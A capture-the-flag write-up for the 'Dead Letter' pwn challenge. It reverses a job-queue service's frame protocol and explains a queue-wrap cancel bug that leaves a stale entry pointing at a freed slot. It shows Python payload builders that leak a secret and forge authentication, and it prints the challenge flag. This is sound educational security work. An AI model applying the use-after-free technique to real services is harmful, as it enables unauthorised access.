# Dead Letter

**Category:** Pwn  ·  **Difficulty:** A lot of reversing, but the final bug is surprisingly simple  ·  **Flag:** `ASIS{5bde7fad6ec7676208a5d225f4230997ef81f0af}`

## Challenge Description

A small job queue split across three stripped 64-bit PIE binaries (all PIE, NX,
full RELRO, stack canaries):

```
dead-letter-queue/
├── relay    # talks to us over TCP
├── warden   # checks that a queued job is safe
└── worker   # actually runs it
```

For every client the relay creates a `0x950`-byte `memfd`, two `eventfd`s, two
`SOCK_SEQPACKET` socketpairs, one warden process, and one worker process. It
writes the flag into a temp dir (e.g. `/tmp/dlq-secret-12345/flag`); the worker
inherits a directory FD and has a hidden authenticated command that eventually
does `openat(secret_dir_fd, "flag", ...)`. Each client gets its own worker,
warden, memory, and secret, so the whole exploit runs on one connection.

Run locally:

```bash
EXPECTED_RELEASE=3eb7dc63e82d85864b3b8849 CTF_FLAG='ASIS{test_flag}' PORT=18112 ./relay
```

## Initial Analysis

The service speaks binary frames, not text. Each frame has a 16-byte
little-endian header:

```c
struct frame {
    uint16_t magic;    // 0x5144  ("DQ" on the wire)
    uint8_t  type;
    uint8_t  status;   // zero in requests
    uint32_t ticket;
    uint16_t length;
    uint16_t aux;
    uint32_t checksum;
    uint8_t  payload[length];
};
```

Responses use the request type with the high bit set (`0x51` → `0xd1`). The
checksum is a tweaked CRC32:

```python
def frame_crc(header_first_12, payload):
    value = zlib.crc32(header_first_12)
    if payload:
        value ^= rol32(zlib.crc32(payload), 1)
    return value ^ 0x0c806284
```

Request types: `0x51` allocate slot, `0x2c` upload payload, `0x28` validate
(warden), `0x67` commit to worker queue, `0x57` cancel/free, `0x44` pop+dispatch.
Normal flow: `allocate → upload → validate → commit → dispatch`.

There are nine `0x108`-byte shared-memory slots (`state, size_class, length,
generation, data[0x100]`), allocated in the fixed order `8,4,6,2,1,3,5,0,7`. The
relay returns an encoded ticket, `ticket = ((generation << 8) | slot) ^ 0x8ee8d27d`,
so `slot = (ticket ^ 0x8ee8d27d) & 0xff`. The generation stops old tickets being
reused, but **the internal worker queue stores only the slot number**, which
matters later.

The **warden** only approves jobs in state 2, length exactly `0x70` (112 bytes),
first byte `0xa1` or `0x69`. It records a content hash; the relay re-checks it
before commit, and re-uploading a validated slot clears the approval, so
"validate safe, then overwrite" is blocked.

The **worker** accepts a 112-byte job in state 2 **or** 3, and supports four
opcodes: `0xa1` echo and `0x69` hash (both approved), plus two the warden
rejects: `0x92` a hidden VM (leak secret / write token) and `0xad` the
authenticated flag-reading attachment. We need `0x92` and `0xad`, but the warden
only approves `0xa1`/`0x69`.

## Vulnerability / Core Concept

**A canceled job is lost when the pending queue wraps.** The relay keeps a
six-entry pending queue (`entries[6]`, `head`, `tail`, `count`) with wrapping
indices `0→1→…→5→0`. When a queued job is canceled, the relay searches for its
slot to mark the entry inactive, but for the wrapped case it only searches from
`head` to entry 5 and never continues from entry 0 to `tail-1`:

```
head = 5, tail = 1
[X][ ][ ][ ][ ][X]   correct: check index 5, then index 0
 ^ tail        ^ head   actual: checks only index 5, forgets index 0
```

Cancellation still frees and clears the shared slot, leaving a **live queue entry
pointing at a now-free slot with no generation recorded**: a use-after-free of a
queue entry / shared slot. Reallocate that slot with a forbidden job, dispatch,
and the forgotten entry executes the new contents.

## Exploitation

Full exploit in `exploit.py` (`client.py` is a minimal framing helper). The
stale-entry primitive is deterministic (no race):

1. Run 5 harmless jobs (each queued + immediately dispatched) to move
   `head = tail = 5`.
2. Allocate/validate/commit a dummy → entry 5, `tail = 0`.
3. Allocate/validate/commit a target → entry 0, queue now wrapped (`head=5,
   tail=1, count=2`).
4. **Cancel the target**: the broken search sees only the dummy at entry 5 and
   stops, but the target's slot is freed.
5. Reallocate that slot (predictably the same slot, e.g. 4) with a forbidden
   112-byte job in state 2 (no validate).
6. **Dispatch twice**: first runs the dummy, second consumes the forgotten entry
   0 which still says "execute slot 4": now holding the forbidden job.

Used three times:

- **Leak the worker secret** with VM opcode `0x92` / instruction `0xb9` index 0:
  ```python
  def vm_leak():
      p = bytearray(112); p[0] = 0x92; p[1] = 12
      struct.pack_into('<III', p, 8, 0xee3575b7, 0xb9, 0)  # magic, leak, secret
      return bytes(p)
  # → [+] secret = 0x2e1e0e4f685e4a85
  ```
- **Recreate the flag auth.** The `0xad` command derives a token via a
  SplitMix64 mixer keyed by the secret over payload bytes 8..111, plus a 32-bit
  tag. Compute `token` and `tag` from the leaked secret:
  ```text
  [+] token = 0x78913b5cb71a487b
  [+] tag   = 0x37f6d8fb
  ```
- **Write the token** into the worker's global with VM `0xca`/`0x59`/`0x96`
  (set low, set high, install):
  ```python
  def vm_set(value, reg=0):
      p = bytearray(112); p[0] = 0x92; p[1] = 36
      struct.pack_into('<9I', p, 8, 0xee3575b7,
                       0xca, reg, value & 0xffffffff,
                       0x59, reg, value >> 32, 0x96, reg)
      return bytes(p)
  ```
- **Read the flag** with the `0xad` attachment (`p[1]=5`, `/flag` at offset 8,
  `tag` at offset 4).

Remote run:

```console
$ python3 exploit.py <HOST> <PORT>
[+] secret = 0x2e1e0e4f685e4a85
[+] token  = 0x78913b5cb71a487b, tag = 0x37f6d8fb
ASIS{5bde7fad6ec7676208a5d225f4230997ef81f0af}
```

## Flag

`ASIS{5bde7fad6ec7676208a5d225f4230997ef81f0af}`

## Key Takeaways

- The intimidating keyed hashes, tags, and mixers are a distraction: each check
  is individually fine.
- The real bug is that ownership is split across two views: shared memory knows
  a slot is free, the pending queue knows which slot to run. Cancellation frees
  the first without reliably clearing the second, so an old approval gets applied
  to a new object.
- Sometimes the easiest way around a perfect security check is not to break it,
  but to make the program apply the old approval to different data.
